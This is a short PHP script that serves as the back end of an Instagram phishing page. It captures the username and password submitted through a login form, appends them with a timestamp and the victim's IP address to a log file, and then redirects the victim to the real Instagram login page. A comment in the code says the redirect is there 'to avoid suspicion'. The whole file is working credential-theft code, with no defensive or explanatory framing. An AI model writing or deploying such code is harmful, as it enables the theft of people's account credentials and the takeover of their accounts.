<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    $data = "Username/Email/Phone: $username | Password: $password | Time: " . date("Y-m-d H:i:s") . " | IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
    
    file_put_contents('log.txt', $data, FILE_APPEND);
    
    // Redirect to real Instagram to avoid suspicion
    header("Location: https://www.instagram.com/accounts/login/");
    exit();
}
?>
